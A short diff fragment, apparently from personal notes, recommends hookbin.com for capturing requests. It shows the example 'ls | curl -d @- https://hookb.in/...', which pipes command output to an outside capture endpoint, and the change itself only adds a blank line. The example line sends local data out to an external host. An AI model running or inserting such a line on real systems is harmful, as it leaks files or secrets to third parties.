@@ -16,3 +16,4 @@ Good tool to send requests without pumping a server:
     https://hookbin.com
     example:
         ls | curl -d @- https://hookb.in/BYo0rDrjP2u202xdPo21
+    
